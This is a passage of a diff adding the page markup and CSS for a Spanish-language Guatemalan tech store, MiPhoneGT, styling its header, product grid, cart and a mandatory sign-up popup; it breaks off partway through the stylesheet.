@@ -1,0 +1,3407 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MiPhoneGT - Tu Tienda de Tecnología #1 en Guatemala</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<style>
+  :root {
+    --primary: #0a0a0f;
+    --accent: #00d4ff;
+    --accent2: #7c3aed;
+    --accent3: #f59e0b;
+    --surface: #111118;
+    --surface2: #1a1a24;
+    --surface3: #22222f;
+    --text: #f0f0f5;
+    --text-muted: #8888aa;
+    --border: rgba(255,255,255,0.08);
+    --success: #10b981;
+    --danger: #ef4444;
+    --card-shadow: 0 8px 32px rgba(0,0,0,0.4);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'DM Sans', sans-serif;
+    background: var(--primary);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* SCROLLBAR */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: var(--surface); }
+  ::-webkit-scrollbar-thumb { background: var(--accent2); border-radius: 3px; }
+
+  /* ========== REGISTRO POPUP (OBLIGATORIO) ========== */
+  #register-wall {
+    position: fixed;
+    inset: 0;
+    z-index: 99999;
+    display: none; /* hidden until 3s delay */
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    background: rgba(0,0,0,0.97);
+    backdrop-filter: blur(12px);
+    overflow-y: auto;
+  }
+
+  #register-wall.wall-visible {
+    display: flex;
+  }
+
+  /* Bloquear scroll mientras el popup esté activo */
+  body.wall-active {
+    overflow: hidden !important;
+    pointer-events: none;
+  }
+  #register-wall {
+    pointer-events: all !important;
+  }
+
+  .reg-card {
+    background: var(--surface);
+    border: 1px solid rgba(0,212,255,0.25);
+    border-radius: 24px;
+    width: 100%;
+    max-width: 520px;
+    box-shadow: 0 0 80px rgba(0,212,255,0.12), 0 40px 100px rgba(0,0,0,0.8);
+    overflow: hidden;
+    animation: regCardIn 0.5s cubic-bezier(0.34,1.56,0.64,1) both;
+    margin: auto;
+  }
+
+  @keyframes regCardIn {
+    from { opacity:0; transform: scale(0.85) translateY(30px); }
+    to   { opacity:1; transform: scale(1) translateY(0); }
+  }
+
+  .reg-header {
+    background: linear-gradient(135deg, #0a0a1f 0%, #0d1a3a 100%);
+    padding: 28px 28px 24px;
+    text-align: center;
+    position: relative;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .reg-logo {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.8rem;
+    font-weight: 800;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    margin-bottom: 8px;
+    display: block;
+  }
+
+  .reg-logo span {
+    background: linear-gradient(135deg, var(--accent3), #f97316);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .reg-header h2 {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.25rem;
+    font-weight: 700;
+    margin-bottom: 6px;
+    color: var(--text);
+  }
+
+  .reg-header p {
+    font-size: 0.83rem;
+    color: var(--text-muted);
+    line-height: 1.5;
+  }
+
+  .reg-benefits {
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    margin-top: 14px;
+    flex-wrap: wrap;
+  }
+
+  .reg-benefit {
+    background: rgba(0,212,255,0.08);
+    border: 1px solid rgba(0,212,255,0.15);
+    border-radius: 20px;
+    padding: 4px 12px;
+    font-size: 0.73rem;
+    color: var(--accent);
+    font-weight: 500;
+  }
+
+  .reg-body {
+    padding: 24px 28px 28px;
+  }
+
+  .reg-progress {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 20px;
+  }
+
+  .reg-step-dot {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.72rem;
+    font-weight: 700;
+    font-family: 'Syne', sans-serif;
+    flex-shrink: 0;
+  }
+
+  .reg-step-dot.done { background: var(--success); color: white; }
+  .reg-step-dot.active { background: var(--accent); color: var(--primary); }
+  .reg-step-dot.pending { background: var(--surface3); color: var(--text-muted); border: 1px solid var(--border); }
+
+  .reg-step-line {
+    flex: 1;
+    height: 2px;
+    border-radius: 1px;
+    background: var(--border);
+  }
+  .reg-step-line.done { background: var(--success); }
+  .reg-step-line.active { background: linear-gradient(90deg, var(--success), var(--accent)); }
+
+  .reg-step-label {
+    position: absolute;
+    font-size: 0.65rem;
+    color: var(--text-muted);
+    white-space: nowrap;
+  }
+
+  .form-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+  }
+
+  .form-group {
+    margin-bottom: 14px;
+  }
+
+  .form-group label {
+    display: block;
+    font-size: 0.78rem;
+    font-weight: 600;
+    color: var(--text-muted);
+    margin-bottom: 6px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+
+  .form-group .req { color: var(--danger); }
+
+  .form-group input,
+  .form-group select,
+  .form-group textarea {
+    width: 100%;
+    background: var(--surface2);
+    border: 1.5px solid var(--border);
+    border-radius: 10px;
+    color: var(--text);
+    padding: 11px 14px;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.88rem;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .form-group input:focus,
+  .form-group select:focus,
+  .form-group textarea:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(0,212,255,0.08);
+  }
+
+  .form-group input.error,
+  .form-group select.error,
+  .form-group textarea.error {
+    border-color: var(--danger);
+    box-shadow: 0 0 0 3px rgba(239,68,68,0.08);
+  }
+
+  .form-group .field-error {
+    font-size: 0.72rem;
+    color: var(--danger);
+    margin-top: 4px;
+    display: none;
+  }
+
+  .form-group input::placeholder,
+  .form-group textarea::placeholder { color: #555570; }
+
+  .form-group select option { background: var(--surface2); }
+
+  .form-group textarea { resize: none; height: 72px; }
+
+  .reg-divider {
+    text-align: center;
+    font-size: 0.75rem;
+    color: var(--text-muted);
+    margin: 16px 0 14px;
+    position: relative;
+  }
+
+  .reg-divider::before, .reg-divider::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    width: 38%;
+    height: 1px;
+    background: var(--border);
+  }
+  .reg-divider::before { left: 0; }
+  .reg-divider::after { right: 0; }
+
+  .reg-submit-btn {
+    width: 100%;
+    background: linear-gradient(135deg, var(--accent), #0088cc);
+    border: none;
+    color: var(--primary);
+    padding: 14px;
+    border-radius: 12px;
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 1rem;
+    cursor: pointer;
+    transition: all 0.25s;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    box-shadow: 0 4px 24px rgba(0,212,255,0.3);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .reg-submit-btn:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 32px rgba(0,212,255,0.45);
+  }
+
+  .reg-submit-btn:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+    transform: none;
+  }
+
+  .reg-submit-btn .btn-spinner {
+    display: none;
+    width: 18px;
+    height: 18px;
+    border: 2px solid rgba(0,0,0,0.3);
+    border-top-color: var(--primary);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .reg-terms {
+    text-align: center;
+    font-size: 0.73rem;
+    color: var(--text-muted);
+    margin-top: 12px;
+    line-height: 1.5;
+  }
+
+  .reg-terms a { color: var(--accent); cursor: pointer; text-decoration: underline; }
+
+  .reg-success {
+    display: none;
+    text-align: center;
+    padding: 40px 28px;
+  }
+
+  .reg-success-icon {
+    font-size: 4rem;
+    margin-bottom: 16px;
+    animation: successPop 0.5s cubic-bezier(0.34,1.56,0.64,1) both;
+  }
+
+  @keyframes successPop {
+    from { transform: scale(0); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+
+  .reg-success h3 {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.4rem;
+    font-weight: 800;
+    margin-bottom: 8px;
+    color: var(--text);
+  }
+
+  .reg-success p {
+    font-size: 0.88rem;
+    color: var(--text-muted);
+    line-height: 1.6;
+    margin-bottom: 24px;
+  }
+
+  .reg-success-btn {
+    background: linear-gradient(135deg, var(--success), #059669);
+    border: none;
+    color: white;
+    padding: 12px 36px;
+    border-radius: 12px;
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 0.95rem;
+    cursor: pointer;
+    transition: all 0.2s;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+
+  .reg-success-btn:hover { transform: translateY(-2px); opacity: 0.95; }
+
+  .reg-no-skip {
+    text-align: center;
+    font-size: 0.72rem;
+    color: #444460;
+    margin-top: 10px;
+    font-style: italic;
+  }
+
+  /* ========== HEADER ========== */
+  header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+    backdrop-filter: blur(20px);
+  }
+
+  .header-top {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 14px 24px;
+    max-width: 1400px;
+    margin: 0 auto;
+  }
+
+  .logo {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 1.6rem;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    white-space: nowrap;
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+  .logo span {
+    background: linear-gradient(135deg, var(--accent3), #f97316);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .location-btn {
+    display: flex;
+    flex-direction: column;
+    color: var(--text-muted);
+    font-size: 0.72rem;
+    cursor: pointer;
+    white-space: nowrap;
+    transition: color 0.2s;
+  }
+  .location-btn strong { color: var(--text); font-size: 0.85rem; }
+  .location-btn:hover strong { color: var(--accent); }
+
+  .search-bar {
+    flex: 1;
+    display: flex;
+    border-radius: 12px;
+    overflow: hidden;
+    border: 2px solid var(--accent);
+    box-shadow: 0 0 20px rgba(0,212,255,0.15);
+  }
+
+  .search-bar select {
+    background: var(--surface3);
+    border: none;
+    color: var(--text-muted);
+    padding: 0 12px;
+    font-family: inherit;
+    font-size: 0.8rem;
+    cursor: pointer;
+    border-right: 1px solid var(--border);
+    outline: none;
+  }
+
+  .search-bar input {
+    flex: 1;
+    background: var(--surface3);
+    border: none;
+    color: var(--text);
+    padding: 12px 16px;
+    font-family: inherit;
+    font-size: 0.95rem;
+    outline: none;
+  }
+
+  .search-bar input::placeholder { color: var(--text-muted); }
+
+  .search-btn {
+    background: var(--accent);
+    border: none;
+    padding: 0 20px;
+    cursor: pointer;
+    color: var(--primary);
+    font-size: 1.1rem;
+    transition: background 0.2s;
+    display: flex;
+    align-items: center;
+  }
+  .search-btn:hover { background: #00b8e0; }
+
+  .header-actions {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+
+  .header-btn {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 8px 12px;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background 0.2s;
+    white-space: nowrap;
+    border: none;
+    background: transparent;
+    color: var(--text);
+    font-family: inherit;
+    font-size: 0.75rem;
+    text-decoration: none;
+    position: relative;
+  }
+  .header-btn:hover { background: var(--surface3); }
+  .header-btn .label { color: var(--text-muted); font-size: 0.68rem; }
+  .header-btn strong { font-size: 0.85rem; font-weight: 600; }
+  .header-btn .icon { font-size: 1.4rem; }
+
+  .cart-badge {
+    position: absolute;
+    top: 4px;
+    right: 8px;
+    background: var(--accent);
+    color: var(--primary);
+    font-size: 0.65rem;
+    font-weight: 800;
+    border-radius: 50%;
+    width: 18px;
+    height: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Syne', sans-serif;
+  }
+
+  /* NAV BAR */
+  .nav-bar {
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .nav-inner {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    max-width: 1400px;
+    margin: 0 auto;
+    padding: 0 24px;
+    overflow-x: auto;
+  }
+
+  .nav-item {
+    padding: 10px 14px;
+    font-size: 0.85rem;
+    cursor: pointer;
+    white-space: nowrap;
+    transition: all 0.2s;
+    border-bottom: 2px solid transparent;
+    color: var(--text);
+    user-select: none;
+  }
+  .nav-item:hover { color: var(--accent); border-bottom-color: var(--accent); }
+  .nav-item.active { color: var(--accent); border-bottom-color: var(--accent); font-weight: 600; }
+
+  /* HERO BANNER */
+  .hero {
+    position: relative;
+    height: 420px;
+    overflow: hidden;
+    background: var(--surface);
+  }
+
+  .hero-slide {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    padding: 0 80px;
+    opacity: 0;
+    transition: opacity 0.7s ease;
+    pointer-events: none;
+  }
+  .hero-slide.active { opacity: 1; pointer-events: auto; }
+
+  .hero-slide-1 {
+    background: linear-gradient(135deg, #0a0a1a 0%, #1a0a2e 40%, #0d1a3a 100%);
+  }
+  .hero-slide-2 {
+    background: linear-gradient(135deg, #0a1a0a 0%, #0a2e1a 40%, #0d3a1a 100%);
+  }
+  .hero-slide-3 {
+    background: linear-gradient(135deg, #1a0a0a 0%, #2e1a0a 40%, #3a1a0d 100%);
+  }
+
+  .hero-bg-glow {
+    position: absolute;
+    width: 500px;
+    height: 500px;
+    border-radius: 50%;
+    filter: blur(100px);
+    opacity: 0.3;
+    right: 200px;
+    top: -100px;
+  }
+
+  .hero-content {
+    z-index: 1;
+    max-width: 500px;
+  }
+
+  .hero-tag {
+    display: inline-block;
+    background: rgba(0,212,255,0.15);
+    border: 1px solid rgba(0,212,255,0.3);
+    color: var(--accent);
+    font-size: 0.75rem;
+    font-weight: 600;
+    padding: 4px 12px;
+    border-radius: 20px;
+    margin-bottom: 16px;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+  }
+
+  .hero-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 3rem;
+    font-weight: 800;
+    line-height: 1.1;
+    margin-bottom: 16px;
+  }
+
+  .hero-title .highlight {
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .hero-desc {
+    color: var(--text-muted);
+    font-size: 1rem;
+    margin-bottom: 28px;
+    line-height: 1.6;
+  }
+
+  .hero-price {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.8rem;
+    font-weight: 700;
+    color: var(--accent3);
+    margin-bottom: 24px;
+  }
+
+  .hero-price span {
+    font-size: 1rem;
+    color: var(--text-muted);
+    font-family: 'DM Sans', sans-serif;
+    font-weight: 400;
+  }
+
+  .hero-actions {
+    display: flex;
+    gap: 12px;
+  }
+
+  .btn-primary {
+    background: linear-gradient(135deg, var(--accent), #0088cc);
+    color: var(--primary);
+    border: none;
+    padding: 12px 28px;
+    border-radius: 10px;
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 0.95rem;
+    cursor: pointer;
+    transition: all 0.2s;
+    box-shadow: 0 4px 20px rgba(0,212,255,0.3);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 28px rgba(0,212,255,0.4); }
+
+  .btn-outline {
+    background: transparent;
+    color: var(--text);
+    border: 1px solid var(--border);
+    padding: 12px 28px;
+    border-radius: 10px;
+    font-family: 'DM Sans', sans-serif;
+    font-weight: 500;
+    font-size: 0.95rem;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .btn-outline:hover { border-color: var(--accent); color: var(--accent); }
+
+  .hero-image {
+    position: absolute;
+    right: 60px;
+    top: 50%;
+    transform: translateY(-50%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    animation: float 3s ease-in-out infinite;
+    z-index: 1;
+  }
+
+  .hero-image img {
+    max-height: 340px;
+    max-width: 280px;
+    object-fit: contain;
+    filter: drop-shadow(0 20px 60px rgba(0,212,255,0.3));
+  }
+
+  @keyframes float {
+    0%, 100% { transform: translateY(-50%) translateY(0); }
+    50% { transform: translateY(-50%) translateY(-15px); }
+  }
+
+  .hero-dots {
+    position: absolute;
+    bottom: 24px;
+    left: 50%;
+    transform: translateX(-50%);
+    display: flex;
+    gap: 8px;
+    z-index: 10;
+  }
+
+  .hero-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.3);
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .hero-dot.active { background: var(--accent); width: 24px; border-radius: 4px; }
+
+  .hero-arrow {
+    position: absolute;
+    top: 50%;
+    transform: translateY(-50%);
+    background: rgba(255,255,255,0.1);
+    border: none;
+    color: white;
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    cursor: pointer;
+    font-size: 1.2rem;
+    transition: background 0.2s;
+    z-index: 10;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .hero-arrow:hover { background: rgba(0,212,255,0.3); }
+  .hero-arrow.left { left: 20px; }
+  .hero-arrow.right { right: 20px; }
+
+  /* PROMO STRIP */
+  .promo-strip {
+    background: linear-gradient(90deg, var(--accent2), var(--accent));
+    padding: 10px;
+    text-align: center;
+    font-family: 'Syne', sans-serif;
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: white;
+    letter-spacing: 0.03em;
+    animation: promoScroll 20s linear infinite;
+  }
+
+  /* MAIN CONTENT */
+  .main {
+    max-width: 1400px;
+    margin: 0 auto;
+    padding: 32px 24px;
+  }
+
+  /* CATEGORY PILLS */
+  .categories {
+    display: flex;
+    gap: 12px;
+    margin-bottom: 40px;
+    overflow-x: auto;
+    padding-bottom: 8px;
+  }
+
+  .cat-pill {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+    padding: 16px 20px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    cursor: pointer;
+    transition: all 0.2s;
+    white-space: nowrap;
+    min-width: 90px;
+    flex-shrink: 0;
+  }
+  .cat-pill:hover, .cat-pill.active { border-color: var(--accent); background: rgba(0,212,255,0.05); }
+  .cat-pill .cat-icon { font-size: 1.8rem; }
+  .cat-pill .cat-name { font-size: 0.78rem; color: var(--text-muted); font-weight: 500; }
+  .cat-pill:hover .cat-name, .cat-pill.active .cat-name { color: var(--accent); }
+
+  /* SECTION TITLE */
+  .section-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 24px;
+  }
+
+  .section-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.4rem;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section-title::before {
+    content: '';
+    display: block;
+    width: 4px;
+    height: 24px;
+    background: linear-gradient(var(--accent), var(--accent2));
+    border-radius: 2px;
+  }
+
+  .see-all {
+    color: var(--accent);
+    font-size: 0.85rem;
+    cursor: pointer;
+    text-decoration: none;
+    font-weight: 500;
+  }
+  .see-all:hover { text-decoration: underline; }
+
+  /* PRODUCT GRID */
+  .products-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+    gap: 20px;
+    margin-bottom: 48px;
+  }
+
+  /* PRODUCT CARD */
+  .product-card {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    overflow: hidden;
+    cursor: pointer;
+    transition: all 0.25s;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .product-card:hover {
+    border-color: rgba(0,212,255,0.3);
+    transform: translateY(-4px);
+    box-shadow: 0 16px 40px rgba(0,0,0,0.4), 0 0 0 1px rgba(0,212,255,0.1);
+  }
+
+  .product-badge {
+    position: absolute;
+    top: 12px;
+    left: 12px;
+    font-family: 'Syne', sans-serif;
+    font-size: 0.68rem;
+    font-weight: 700;
+    padding: 4px 10px;
+    border-radius: 6px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    z-index: 2;
+  }
+
+  .badge-new { background: var(--accent); color: var(--primary); }
+  .badge-sale { background: var(--danger); color: white; }
+  .badge-hot { background: var(--accent3); color: var(--primary); }
+  .badge-top { background: var(--accent2); color: white; }
+  .badge-popular { background: var(--success); color: white; }
+
+  .wishlist-btn {
+    position: absolute;
+    top: 12px;
+    right: 12px;
+    background: rgba(0,0,0,0.5);
+    border: none;
+    color: var(--text-muted);
+    width: 34px;
+    height: 34px;
+    border-radius: 50%;
+    cursor: pointer;
+    font-size: 1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.2s;
+    z-index: 2;
+    backdrop-filter: blur(10px);
+  }
+  .wishlist-btn:hover { color: var(--danger); background: rgba(239,68,68,0.15); }
+  .wishlist-btn.active { color: var(--danger); }
+
+  .product-img-wrap {
+    background: var(--surface3);
+    height: 200px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 7rem;
+    padding: 20px;
+    transition: transform 0.3s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .product-img-wrap::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(ellipse at center, rgba(0,212,255,0.03) 0%, transparent 70%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .product-img {
+    max-width: 88%;
+    max-height: 88%;
+    object-fit: contain;
+    display: block;
+    transition: transform 0.35s cubic-bezier(0.34,1.56,0.64,1);
+    filter: drop-shadow(0 10px 28px rgba(0,0,0,0.5));
+    position: relative;
+    z-index: 1;
+  }
+
+  .product-card:hover .product-img {
+    transform: scale(1.08) translateY(-5px);
+  }
+
+  .product-emoji-fallback,
+  .product-emoji {
+    font-size: 6.5rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: transform 0.3s;
+    filter: drop-shadow(0 8px 20px rgba(0,0,0,0.5));
+    position: relative;
+    z-index: 1;
+  }
+
+  .product-card:hover .product-emoji-fallback,
+  .product-card:hover .product-emoji {
+    transform: scale(1.06) translateY(-4px);
+  }
+
+  .product-info {
+    padding: 16px;
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .product-brand {
+    font-size: 0.72rem;
+    color: var(--accent);
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    margin-bottom: 4px;
+  }
+
+  .product-name {
+    font-family: 'Syne', sans-serif;
+    font-size: 0.95rem;
+    font-weight: 600;
+    line-height: 1.3;
+    margin-bottom: 8px;
+    color: var(--text);
+  }
+
+  .product-specs {
+    font-size: 0.75rem;
+    color: var(--text-muted);
+    margin-bottom: 10px;
+    line-height: 1.5;
+  }
+
+  .product-rating {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    margin-bottom: 12px;
+  }
+
+  .stars { color: var(--accent3); font-size: 0.85rem; letter-spacing: 1px; }
+  .rating-count { font-size: 0.75rem; color: var(--text-muted); }
+
+  .product-price-row {
+    display: flex;
+    align-items: flex-end;
+    gap: 8px;
+    margin-bottom: 14px;
+    margin-top: auto;
+  }
+
+  .product-price {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: var(--text);
+  }
+
+  .product-price-old {
+    font-size: 0.85rem;
+    color: var(--text-muted);
+    text-decoration: line-through;
+  }
+
+  .product-discount {
+    font-size: 0.75rem;
+    color: var(--success);
+    font-weight: 600;
+  }
+
+  .product-delivery {
+    font-size: 0.75rem;
+    color: var(--text-muted);
+    margin-bottom: 14px;
+  }
+  .product-delivery .fast { color: var(--accent); font-weight: 600; }
+
+  .add-cart-btn {
+    width: 100%;
+    background: linear-gradient(135deg, var(--accent2), #4f46e5);
+    border: none;
+    color: white;
+    padding: 10px;
+    border-radius: 10px;
+    font-family: 'Syne', sans-serif;
+    font-weight: 600;
+    font-size: 0.85rem;
+    cursor: pointer;
+    transition: all 0.2s;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  .add-cart-btn:hover { opacity: 0.9; transform: translateY(-1px); }
+  .add-cart-btn.added {
+    background: linear-gradient(135deg, var(--success), #059669);
+  }
+
+  /* DEALS SECTION */
+  .deals-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 16px;
+    margin-bottom: 48px;
+  }
+
+  /* BANNER ROW */
+  .banner-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 16px;
+    margin-bottom: 48px;
+  }
+
+  .mini-banner {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 24px;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+  .mini-banner:hover { border-color: rgba(0,212,255,0.3); transform: translateY(-2px); }
+
+  .mini-banner-icon {
+    font-size: 2.5rem;
+    margin-bottom: 12px;
+    display: block;
+  }
+
+  .mini-banner h3 {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.1rem;
+    font-weight: 700;
+    margin-bottom: 6px;
+  }
+
+  .mini-banner p {
+    font-size: 0.82rem;
+    color: var(--text-muted);
+    line-height: 1.5;
+  }
+
+  .mini-banner .mb-glow {
+    position: absolute;
+    width: 150px;
+    height: 150px;
+    border-radius: 50%;
+    filter: blur(60px);
+    opacity: 0.15;
+    right: -30px;
+    bottom: -30px;
+  }
+
+  /* FILTER SIDEBAR */
+  .shop-layout {
+    display: grid;
+    grid-template-columns: 240px 1fr;
+    gap: 24px;
+    margin-bottom: 48px;
+  }
+
+  .sidebar {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 20px;
+    height: fit-content;
+    position: sticky;
+    top: 90px;
+  }
+
+  .sidebar-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 1rem;
+    font-weight: 700;
+    margin-bottom: 16px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .filter-group {
+    margin-bottom: 20px;
+  }
+
+  .filter-label {
+    font-size: 0.8rem;
+    font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 10px;
+  }
+
+  .filter-option {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 8px;
+    cursor: pointer;
+    font-size: 0.85rem;
+    transition: color 0.2s;
+  }
+  .filter-option:hover { color: var(--accent); }
+
+  .filter-option input[type="checkbox"] {
+    accent-color: var(--accent);
+    width: 15px;
+    height: 15px;
+    cursor: pointer;
+  }
+
+  .price-range {
+    padding: 4px 0;
+  }
+
+  .price-range input[type="range"] {
+    width: 100%;
+    accent-color: var(--accent);
+    cursor: pointer;
+  }
+
+  .price-labels {
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.78rem;
+    color: var(--text-muted);
+    margin-top: 6px;
+  }
+
+  /* CART PANEL */
+  .cart-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.7);
+    z-index: 2000;
+    display: none;
+    backdrop-filter: blur(4px);
+  }
+  .cart-overlay.open { display: block; }
+
+  .cart-panel {
+    position: fixed;
+    right: 0;
+    top: 0;
+    bottom: 0;
+    width: 420px;
+    background: var(--surface);
+    border-left: 1px solid var(--border);
+    z-index: 2001;
+    transform: translateX(100%);
+    transition: transform 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    box-shadow: -20px 0 60px rgba(0,0,0,0.5);
+  }
+  .cart-panel.open { transform: translateX(0); }
+
+  .cart-header {
+    padding: 20px 24px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .cart-header h2 {
+    font-family: 'Syne', sans-serif;
+    font-size: 1.2rem;
+    font-weight: 700;
+  }
+
+  .close-btn {
+    background: var(--surface3);
+    border: none;
+    color: var(--text);
+    width: 34px;
+    height: 34px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 1.1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background 0.2s;
+  }
+  .close-btn:hover { background: var(--danger); }
+
+  .cart-items {
+    flex: 1;
+    overflow-y: auto;
+    padding: 16px 24px;
+  }
+
+  .cart-item {
+    display: flex;
+    gap: 14px;
+    padding: 14px 0;
+    border-bottom: 1px solid var(--border);
+    align-items: flex-start;
+  }
+
+  .cart-item-img {
+    background: var(--surface3);
+    width: 64px;
+    height: 64px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 2.2rem;
+    flex-shrink: 0;
+  }
+
+  .cart-item-info { flex: 1; }
+
+  .cart-item-name {
+    font-size: 0.85rem;
+    font-weight: 600;
+    margin-bottom: 4px;
+    line-height: 1.3;
+  }
+
+  .cart-item-price {
+    font-family: 'Syne', sans-serif;
+    color: var(--accent);
+    font-weight: 700;
+    font-size: 0.95rem;
+    margin-bottom: 8px;
+  }
+
+  .qty-control {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .qty-btn {
+    background: var(--surface3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    width: 26px;
+    height: 26px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.2s;
+  }
+  .qty-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+  .qty-num { font-size: 0.85rem; font-weight: 600; min-width: 20px; text-align: center; }
+
